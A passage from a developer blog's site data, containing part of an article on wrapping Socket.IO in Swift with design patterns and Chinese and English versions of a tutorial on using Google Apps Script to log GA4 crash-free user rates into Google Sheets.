throws { try stateMachine.enterConnected() } func onDisconnected() throws { // } func release(socketManager: SIOManagerSpec) throws { try stateMachine.enterReleased() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { try stateMachine.enterReconnecting() // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReconnectingState: SIOConnectionState { let connectionState: ConnectionState = .reconnecting let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { try stateMachine.enterConnected() } func onDisconnected() throws { try stateMachine.enterDisconnected() } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't release!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func send(socketManager: SIOManagerSpec, event: String) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReconnectState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { // allow // can use Helper to reduce the repeating code // e.g. helper.XXX(socketManager: SIOManagerSpec, ....) }}class SIOConnectionReleasedState: SIOConnectionState { let connectionState: ConnectionState = .released let stateMachine: SIOConnectionStateMachine required init(stateMachine: SIOConnectionStateMachine) { self.stateMachine = stateMachine } func onConnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onConnected!\") } func onDisconnected() throws { throw SIOConnectionStateMachineError(\"ReleasedState can't onDisconnected!\") } func release(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't release!\") } func request(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't request!\") } func onEvent(socketManager: SIOManagerSpec, event: String, callback: @escaping (Data?) -&gt; Void) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't receiveOn!\") } func send(socketManager: SIOManagerSpec, event: String) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't send!\") } func connect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't connect!\") } func disconnect(socketManager: SIOManagerSpec) throws { throw SIOConnectionStateMachineError(\"ReleasedState can't disconnect!\") }}do { let stateMachine = SIOConnectionStateMachine() // mock on socket.io connect: // socketIO.on(connect){ try stateMachine.currentSIOConnectionState.onConnected() try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") try stateMachine.currentSIOConnectionState.release(socketManager: manager) try stateMachine.currentSIOConnectionState.send(socketManager: manager, event: \"test\") // }} catch { print(\"error: \\(error)\")}// output:// error: SIOConnectionStateMachineError(message: \"ConnectedState can't release!\")Scenario 3What?Combining scenarios 1 and 2, with the ConnectionPool as a flyweight pool and the State Pattern for state management, we further extend the functionality. As described in the background objectives, the feature side should not concern itself with the underlying connection mechanism. Therefore, we create a poller (named ConnectionKeeper) that periodically scans the ConnectionPool for strongly held Connections and performs operations under the following conditions: If a Connection is in use and its state is not Connected: change its state to Reconnecting and attempt to reconnect. If a Connection is not in use and its state is Connected: change its state to Disconnected. If a Connection is not in use and its state is Disconnected: change its state to Released and remove it from the ConnectionPool.Why? The three operations have a hierarchical relationship and are mutually exclusive (i.e., disconnected can lead to either released or reconnecting). This allows for flexible substitution and addition of operational conditions. Without encapsulation, the three checks and operations would have to be written directly in the method (making it difficult to test the logic). For example:if !connection.isOccupie() &amp;&amp; connection.state == .connected { ... connection.disconnected()} else if !connection.isOccupie() &amp;&amp; state == .released { ... connection.release()} else if connection.isOccupie() &amp;&amp; state == .disconnected { ... connection.reconnecting()}How? Chain Of Responsibility: A behavioral pattern that, as the name suggests, forms a chain where each node has a corresponding operation. After inputting data, the node can decide whether to process it or pass it to the next node. Another real-world application is the iOS Responder Chain. According to the definition, the Chain of Responsibility Pattern does not allow a node that has already taken responsibility for processing data to pass it on to the next node for further processing. If you do it, do it completely; otherwise, don’t do it at all. For the above scenario, a more suitable pattern would be the Interceptor Pattern. Chain of Responsibility: ConnectionKeeperHandler is the abstract node of the chain, specifically extracting the canExecute method to avoid the situation where a node processes the data but then wants to call the next node to continue execution. The handle method connects the nodes in the chain, and the execute method defines the logic for how to handle the operation. ConnectionKeeperHandlerContext is used to store relevant data, with isOccupie indicating whether the Connection is in use.enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState { get } var url: URL { get } var id: UUID { get } init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//struct ConnectionKeeperHandlerContext { let connection: Connection let isOccupie: Bool}protocol ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? { get set } func handle(context: ConnectionKeeperHandlerContext) func execute(context: ConnectionKeeperHandlerContext) func canExcute(context: ConnectionKeeperHandlerContext) -&gt; Bool}extension ConnectionKeeperHandler { func handle(context: ConnectionKeeperHandlerContext) { if canExcute(context: context) { execute(context: context) } else { nextHandler?.handle(context: context) } }}class DisconnectedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExecute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .connected &amp;&amp; !context.isOccupied { return true } return false }}class ReconnectConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.reconnect() } func canExecute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; context.isOccupied { return true } return false }}class ReleasedConnectionKeeperHandler: ConnectionKeeperHandler { var nextHandler: ConnectionKeeperHandler? func execute(context: ConnectionKeeperHandlerContext) { context.connection.disconnect() } func canExecute(context: ConnectionKeeperHandlerContext) -&gt; Bool { if context.connection.connectionState == .disconnected &amp;&amp; !context.isOccupied { return true } return false }}let connection = SIOConnection(url: URL(string: \"wss://pinkoi.com\")!)let disconnectedHandler = DisconnectedConnectionKeeperHandler()let reconnectHandler = ReconnectConnectionKeeperHandler()let releasedHandler = ReleasedConnectionKeeperHandler()disconnectedHandler.nextHandler = reconnectHandlerreconnectHandler.nextHandler = releasedHandlerdisconnectedHandler.handle(context: ConnectionKeeperHandlerContext(connection: connection, isOccupied: false))Scenario 4What?The Connection we encapsulated needs to be set up before use, such as providing a URL path, configuring settings, etc.Why? Allows for flexible addition or removal of construction openings. Enables reuse of construction logic. If not encapsulated, external entities can operate the class in unexpected ways. e.g.:❌let connection = Connection()connection.send(event) // unexpected method call, should call .connect() first✅let connection = Connection()connection.connect()connection.send(event)// but...who knows???How? Builder Pattern: A creational pattern that allows for step-by-step construction of objects and reuse of construction methods. Builder Pattern: SIOConnectionBuilder serves as the builder for Connection, responsible for setting and storing data needed to construct a Connection; the ConnectionConfiguration abstract interface ensures that .connect() must be called before obtaining a Connection instance.enum ConnectionState { case created case connected case disconnected case reconnecting case released}protocol Connection { var connectionState: ConnectionState { get } var url: URL { get } var id: UUID { get } init(url: URL) func connect() func reconnect() func disconnect() func sendEvent(_ event: String) func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt;}// Socket.IO Implementationclass SIOConnection: Connection { let connectionState: ConnectionState = .created let url: URL let id: UUID = UUID() required init(url: URL) { self.url = url // } func connect() { // } func disconnect() { // } func reconnect() { // } func sendEvent(_ event: String) { // } func onEvent(_ event: String) -&gt; AnyPublisher&lt;Data?, Never&gt; { // return PassthroughSubject&lt;Data?, Never&gt;().eraseToAnyPublisher() }}//class SIOConnectionClient: ConnectionConfiguration { private let url: URL private let config: [String: Any] init(url: URL, config: [String: Any]) { self.url = url self.config = config } func connect() -&gt; Connection { // set config return SIOConnection(url: url) }}protocol ConnectionConfiguration { func connect() -&gt; Connection}class SIOConnectionBuilder { private(set) var config: [String: Any] = [:] func setConfig(_ config: [String: Any]) -&gt; SIOConnectionBuilder { self.config = config return self } // url is a required parameter func build(url: URL) -&gt; ConnectionConfiguration { return SIOConnectionClient(url: url, config: self.config) }}let builder = SIOConnectionBuilder().setConfig([\"test\": 123])let connection1 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()let connection2 = builder.build(url: URL(string: \"wss://pinkoi.com/1\")!).connect()Additionally, the Factory Pattern can also be applied here to produce SIOConnection through a factory.ConclusionThis concludes the four scenarios encountered during the encapsulation of Socket.IO and the seven design patterns used to solve these problems.Finally, here is the complete design blueprint for the Socket.IO encapsulation.This diagram represents the actual design architecture, which may differ slightly from the naming and examples in the text. We hope to have the original designer share their design philosophy and open-source it in the future.Who?Who designed and is responsible for the Socket.IO encapsulation project?Sean Zheng, Android Engineer @ PinkoiMain architect designer, evaluated and applied design patterns, implemented the design using Kotlin on the Android side.ZhgChgLi, Engineer Lead/iOS Engineer @ PinkoiProject lead for the Platform Team, engaged in pair programming, implemented the design using Swift on the iOS side, discussed and raised questions (a.k.a. contributed ideas), and finally wrote this article to share with everyone.Further Reading Practical applications of Design Patterns — In WKWebView with Builder, Strategy &amp; Chain of Responsibility Pattern Visitor Pattern in Swift (Share Object to XXX Example) Visitor Pattern in TableViewIf you have any questions or feedback, feel free to contact me.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 3,931 Total Views Last Statistics Date: 2025-08-15 | 3,650 Views on Medium." }, { "title": "Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate", "url": "/posts/zrealm-dev/crashlytics-google-analytics-%E8%87%AA%E5%8B%95%E6%9F%A5%E8%A9%A2-app-crash-free-users-rate-793cb8f89b72/", "categories": "ZRealm Dev.", "tags": "crashlytics, ios-app-development, google-analytics, google-apps-script, google-sheets", "date": "2021-11-21 22:47:10 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate使用 Google Apps Script 透過 Google Analytics 查詢 Crashly...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.Crashlytics + Google Analytics 自動查詢 App Crash-Free Users Rate使用 Google Apps Script 透過 Google Analytics 查詢 Crashlytics 自動填入到 Google Sheet 上篇「 Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 」我們將 Crashlytics 閃退紀錄 Export Raw Data 到 Big Query，並使用 Google Apps Script 自動排程查詢 Top 10 Crash &amp; 發布訊息到 Slack Channel。本篇接續自動化一個與 App 閃退相關的重要數據 — Crash-Free Users Rate 不受影響使用者的百分比 ，想必很多 App Team 都會持續追縱、紀錄此數據，以往都是傳統人工手動查詢，本篇目標是將此重複性工作自動化、也能避免人工查詢時可能貼錯數據的狀況；同之前所述，Firebase Crashlytics 沒有提供任何 API 供使用者查詢，所以我們同樣要借助將 Firebase 數據串接到其他 Google 服務，再透過該服務 API 查詢相關數據。一開始我以為這個數據同樣能從 Big Query 查詢出來；但其實這方向完全錯誤，因為 Big Query 是 Crash 的 Raw Data，不會有沒有閃退的人的數據，因此也算不出 Crash-Free Users Rate；關於這個需求在網路上的資料不多，查詢許久才找到有人提到 Google Analytics 這個關鍵字；我知道 Firebase 的 Analytics、Event 都能串到 GA 查詢使用，但沒想到 Crash-Free Users Rate 這個數據也包含在內，翻閱了 GA 的 API 後，Bingo！API Dimensions &amp; MetricsGoogle Analytics Data API (GA4) 提供兩個 Metrics： crashAffectedUsers ：受閃退影響的使用者數量 crashFreeUsersRate ：不受閃退影響的使用者百分比(小數表示)知道路通之後，就可以開始動手實作了！串接 Firebase -&gt; Google Analytics可參考 官方說明 步驟設定，本篇省略。GA4 Query Explorer Tool開始寫 Code 之前，我們可以先用官方提供的 Web GUI Tool 來快速建造查詢條件、取得查詢結果；實驗完結果是我們想要的之後，再開始寫 Code。前前往 &gt;&gt;&gt; GA4 Query Explorer 在左上方記得選到 GA4 右方登入完帳號後，選擇相應的 GA Account &amp; Property Start Date、EndDate：可直接輸入日期或用特殊變數表示日期 ( ysterday , today , 30daysAgo , 7daysAgo ) metrics：增加 crashFreeUsersRate dimensions：增加 platform (設備類型 iOS/Android/Desktop. . . ) dimension filter：增加 platform 、 string 、 exact 、 iOS or Android針對雙平台的 Crash Free Users Rate 分別查詢。拉到最下面點擊「Make Request」查看結果，我們就能得到指定日期範圍內的 Crash-Free Users Rate。 可以回頭打開 Firebase Crashlytics 比對同樣條件數據是否相同。 這邊有發現兩邊數字可能會有微微差距(我們有一項數字差了 0.0002)，原因不明，不過在可以接受的誤差範圍內；若統一都使用 GA Crash-Free Users Rate 那也不能算是誤差了。使用 Google Apps Script 自動填入數據到 Google Sheet再來就是自動化的部分，我們將使用 Google Apps Script 查詢 GA Crash-Free Users Rate 數據後自動填入到我們的 Google Sheet 表單；已達自動填寫、自動追蹤的目標。假設我們的 Google Sheet 如上圖。可以點擊 Google Sheet 上方的 Extensions -&gt; Apps Script 建立 Google Apps Script 或是 點此前網 Google Apps Script -&gt; 左上方 新增專案即可。進來後可以先點上方未命名專案名稱，給個專案名稱。在左方的「Services」點「+」加上「Google Analytics Data API」。回到剛剛的 GA4 Query Explorer 工具，在 Make Request 按鈕旁邊可以勾選「Show Request JSON」取得此條件的 Request JSON。將此 Request JSON 轉換成 Google Apps Script 後如下：// Remeber add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet 名稱const googleSheetName = \"App Crash-Free Users Rate\";function execute() { Logger.log(fetchCrashFreeUsersRate())}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;} GA Property ID：一樣也可以由剛剛的 GA4 Query Explorer 工具取得：在一開始的選擇 Property 選單中，選擇的 Property 下方的數字就是 propertyId 。 googleSheetID：可以由 Google Sheet 網址中取得 https://docs.google.com/spreadsheets/d/ googleSheetID /edit googleSheetName：Google Sheet 中閃退紀錄的 Sheet 名稱將以上程式碼貼到 Google Apps Script 右方程式碼區塊＆上方執行方法選擇「execute」function 後可以點擊 Debug 測試看看是否能正常取得資料：第一次執行會出現要求授權視窗：按照步驟完成帳號授權即可。執行成功會在下方 Log Print 出 Crash-Free Users Rate，代表查詢成功。再來我們只要再加上自動填入 Google Sheet 就大功告成了！完整 Code：// Remeber add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet 名稱const googleSheetName = \"\";function execute() { const today = new Date(); const daysAgo7 = new Date(new Date().setDate(today.getDate() - 6)); // 今天不算，所以是 -6 const spreadsheet = SpreadsheetApp.openById(googleSheetID); const sheet = spreadsheet.getSheetByName(googleSheetName); var rows = []; rows[0] = Utilities.formatDate(daysAgo7, \"GMT+8\", \"MM/dd\")+\"~\"+Utilities.formatDate(today, \"GMT+8\", \"MM/dd\"); rows[1] = fetchCrashFreeUsersRate(\"iOS\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); rows[2] = fetchCrashFreeUsersRate(\"android\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); sheet.appendRow(rows);}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;}再次點擊上方 Run or Debug 執行「execute」。回到 Google Sheet，數據新增成功！新增 Trigger 排程自動執行選擇左方時鐘按鈕 -&gt; 右下方「+ Add Trigger」。 第一個 function 選擇「execute」 time based trigger 可選擇 week timer 每週追蹤＆新增一次數據設定完點擊 Save 即可。完成現在開始，紀錄追蹤 App Crash-Free Users Rate 數據完全自動化；不需要人工手動查詢＆填入；全部交給機器自動處理！ 我們只需專注在解決 App Crash 問題！ p.s. 不同於上一篇使用 Big Query 需要花錢查詢資料，此篇查詢 Crash-Free Users Rate、Google Apps Script 都是完全免費，可以放心使用。如果想將結果同步發送到 Slack Channel 可參考 上一篇文章 ：延伸閱讀 Ultimate Beginner’s Guide to Google Analytics 4 (NEW 2023 Interface) (Thanks to Emma for providing the information ) Crashlytics + Big Query 打造更即時便利的 Crash 追蹤工具 使用 Python+Google Cloud Platform+Line Bot 自動執行例行瑣事 Slack 打造全自動 WFH 員工健康狀況回報系統 運用 Google Apps Script 轉發 Gmail 信件到 Slack有任何問題及指教歡迎 與我聯絡 。本文首次發表於 Medium ➡️ 前往查看由 ZMediumToMarkdown 與 Medium-to-jekyll-starter 提供自動轉換與同步技術。Improve this page on Github.Follow Me on Medium 1K+ Followers 1,208 Total Views Last Statistics Date: 2025-08-15 | 1,074 Views on Medium." }, { "title": "Crashlytics + Google Analytics Automatic Query for App Crash-Free Users Rate", "url": "/posts/zrealm-dev/en/crashlytics-google-analytics-automatic-query-for-app-crash-free-users-rate-793cb8f89b72/", "categories": "ZRealm Dev.", "tags": "crashlytics, ios-app-development, google-analytics, google-apps-script, google-sheets", "date": "2021-11-21 22:47:10 +0800", "snippet": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Crashlytics + Google Analytics Automatic Query for App Crash-Free Users RateUsing Go...", "content": "ℹ️ℹ️ℹ️ The following content is translated by OpenAI.Click here to view the original Chinese version. | 點此查看本文中文版Crashlytics + Google Analytics Automatic Query for App Crash-Free Users RateUsing Google Apps Script to automatically query Crashlytics data through Google Analytics and fill it into Google Sheets In the previous article “Crashlytics + Big Query Creating a More Immediate and Convenient Crash Tracking Tool”, we exported Crashlytics crash logs as Raw Data to Big Query and used Google Apps Script to schedule automatic queries for the Top 10 crashes and publish messages to a Slack Channel.This article continues the automation of an important metric related to app crashes — Crash-Free Users Rate, the percentage of users not affected by crashes. Many app teams likely track and record this metric continuously, which has traditionally been done manually. The goal of this article is to automate this repetitive task and avoid potential errors when manually querying data. As mentioned earlier, Firebase Crashlytics does not provide any API for users to query, so we will similarly need to connect Firebase data to other Google services and then query the relevant data through that service’s API.Initially, I thought this data could also be queried from Big Query; however, this approach was completely wrong because Big Query contains the Raw Data of crashes and does not include data for users who did not crash, making it impossible to calculate the Crash-Free Users Rate. There is not much information available online regarding this requirement, but after some searching, I found someone mentioning the keyword Google Analytics. I knew that Firebase’s Analytics and Events could be connected to GA for querying, but I didn’t realize that the Crash-Free Users Rate was also included. After reviewing the GA API, Bingo!API Dimensions &amp; MetricsGoogle Analytics Data API (GA4) provides two metrics: crashAffectedUsers: the number of users affected by crashes crashFreeUsersRate: the percentage of users not affected by crashes (expressed as a decimal)Now that I know the way forward, I can start implementing it!Connecting Firebase -&gt; Google AnalyticsYou can refer to the official documentation for setup steps, which will be omitted in this article.GA4 Query Explorer ToolBefore we start writing code, we can use the official web GUI tool to quickly build query conditions and obtain query results. After experimenting and confirming that the results are what we want, we can then start writing code.Go to &gt;&gt;&gt; GA4 Query Explorer In the upper left corner, remember to select GA4. After logging in on the right, choose the corresponding GA Account &amp; Property. Start Date, End Date: You can directly enter dates or use special variables to represent dates ( yesterday, today, 30daysAgo, 7daysAgo ) metrics: add crashFreeUsersRate dimensions: add platform (device type iOS/Android/Desktop…) dimension filter: add platform, string, exact, iOS or AndroidQuery the Crash Free Users Rate separately for both platforms.Scroll down and click “Make Request” to view the results, and we will obtain the Crash-Free Users Rate for the specified date range. You can go back and open Firebase Crashlytics to compare the data under the same conditions. Here, I noticed that the numbers on both sides might have slight discrepancies (one number differed by 0.0002), the reason is unclear, but it is within an acceptable margin of error; if we consistently use GA’s Crash-Free Users Rate, it wouldn’t even be considered an error.Using Google Apps Script to Automatically Fill Data into Google SheetsNext is the automation part, where we will use Google Apps Script to query the GA Crash-Free Users Rate data and automatically fill it into our Google Sheets form; achieving the goal of automatic filling and tracking.Assuming our Google Sheet looks like the image above.You can click on Extensions -&gt; Apps Script in Google Sheets to create a Google Apps Script, or click here for Google Apps Script -&gt; and click on “New Project” in the upper left corner.Once inside, you can click on the unnamed project name at the top to give it a project name.In the left “Services” section, click the “+” to add “Google Analytics Data API”.Return to the previous GA4 Query Explorer tool, and next to the Make Request button, you can check “Show Request JSON” to obtain the Request JSON for these conditions.Convert this Request JSON into Google Apps Script as follows:// Remember to add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet nameconst googleSheetName = \"App Crash-Free Users Rate\";function execute() { Logger.log(fetchCrashFreeUsersRate())}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;} GA Property ID: You can also obtain it from the previous GA4 Query Explorer tool:In the initial selection Property dropdown, the number below the selected Property is the propertyId. googleSheetID: This can be obtained from the Google Sheet URL https://docs.google.com/spreadsheets/d/ googleSheetID /edit googleSheetName: The name of the sheet in Google Sheets where crash records are stored.Paste the above code into the code section on the right in Google Apps Script &amp; select the “execute” function from the dropdown at the top, then click Debug to test if it can retrieve data correctly:The first execution will prompt an authorization window:Follow the steps to complete account authorization.If executed successfully, the Crash-Free Users Rate will be printed in the Log below, indicating that the query was successful.Next, we just need to add the automatic filling into Google Sheets, and we will be all set!Complete Code:// Remember to add Google Analytics Data API to Services, or you'll see this error: ReferenceError: AnalyticsData is not defined// https://ga-dev-tools.web.app/ga4/query-explorer/ -&gt; property idconst propertyId = \"\";// https://docs.google.com/spreadsheets/d/googleSheetID/const googleSheetID = \"\";// Google Sheet nameconst googleSheetName = \"\";function execute() { const today = new Date(); const daysAgo7 = new Date(new Date().setDate(today.getDate() - 6)); // Today is not counted, so it's -6 const spreadsheet = SpreadsheetApp.openById(googleSheetID); const sheet = spreadsheet.getSheetByName(googleSheetName); var rows = []; rows[0] = Utilities.formatDate(daysAgo7, \"GMT+8\", \"MM/dd\")+\"~\"+Utilities.formatDate(today, \"GMT+8\", \"MM/dd\"); rows[1] = fetchCrashFreeUsersRate(\"iOS\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); rows[2] = fetchCrashFreeUsersRate(\"android\", Utilities.formatDate(daysAgo7, \"GMT+8\", \"yyyy-MM-dd\"), Utilities.formatDate(today, \"GMT+8\", \"yyyy-MM-dd\")); sheet.appendRow(rows);}function fetchCrashFreeUsersRate(platform = \"iOS\", startDate = \"30daysAgo\", endDate = \"today\") { const dimensionPlatform = AnalyticsData.newDimension(); dimensionPlatform.name = \"platform\"; const metric = AnalyticsData.newMetric(); metric.name = \"crashFreeUsersRate\"; const dateRange = AnalyticsData.newDateRange(); dateRange.startDate = startDate; dateRange.endDate = endDate; const filterExpression = AnalyticsData.newFilterExpression(); const filter = AnalyticsData.newFilter(); filter.fieldName = \"platform\"; const stringFilter = AnalyticsData.newStringFilter() stringFilter.value = platform; stringFilter.matchType = \"EXACT\"; filter.stringFilter = stringFilter; filterExpression.filter = filter; const request = AnalyticsData.newRunReportRequest(); request.dimensions = [dimensionPlatform]; request.metrics = [metric]; request.dateRanges = dateRange; request.dimensionFilter = filterExpression; const report = AnalyticsData.Properties.runReport(request, \"properties/\" + propertyId); return parseFloat(report.rows[0].metricValues[0].value) * 100;}Click the Run or Debug button again to execute the “execute” function.Return to Google Sheets, and the data has been successfully added!Add Trigger for Automatic ExecutionSelect the clock button on the left -&gt; click “+ Add Trigger” in the lower right corner. For the first function, select “execute” For the time-based trigger, you can choose a weekly timer to track and add data once a week.After setting, click Save.CompletionFrom now on, the recording and tracking of App Crash-Free Users Rate data will be fully automated; no manual querying or filling is required; everything is handled automatically by the machine! We only need to focus on solving App Crash issues! p.s. Unlike the previous article where using Big Query required payment for querying data, this article’s query for Crash-Free Users Rate and Google Apps Script is completely free to use.If you want to sync the results to a Slack Channel, you can refer to the previous article :Further Reading Ultimate Beginner’s Guide to Google Analytics 4 (NEW 2023 Interface) (Thanks to Emma for providing the information ) Crashlytics + Big Query Creating a More Immediate and Convenient Crash Tracking Tool Using Python+Google Cloud Platform+Line Bot to Automate Routine Tasks Creating a Fully Automated WFH Employee Health Status Reporting System with Slack Using Google Apps Script to Forward Gmail Messages to SlackIf you have any questions or suggestions, feel free to contact me 。This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 1,208 Total Views Last Statistics Date: 2025-08-15 | 1,074 Views on Medium." }, { "title": "iOS 隱私與便利的前世今生", "url": "/posts/zrealm-dev/ios-%E9%9A%B1%E7%A7%81%E8%88%87%E4%BE%BF%E5%88%A9%E7%9A%84%E5%89%8D%E4%B8%96%E4%BB%8A%E7%94%9F-9a05f632eba0/", "categories": "ZRealm Dev.", "tags": "ios-app-development, privacy, private-relay, apple-privacy, mopcon", "date": "2021-10-24 09:15:55 +0800", "snippet": "iOS 隱私與便利的前世今生Apple 隱私原則及 iOS 歷年對隱私保護的功能調整Theme by slidego[2023–08–01] iOS 17 Update對於之前演講的最新 iOS 17 隱私相關調整補充。Link Tracking ProtectionSafari 會自動移除網址的 Tracking Parameter 參數 (e.g. fbclid 、 gclid …) ...", "content": "iOS 隱私與便利的前世今生Apple 隱私原則及 iOS 歷年對隱私保護的功能調整Theme by slidego[2023–08–01] iOS 17 Update對於之前演講的最新 iOS 17 隱私相關調整補充。Link Tracking 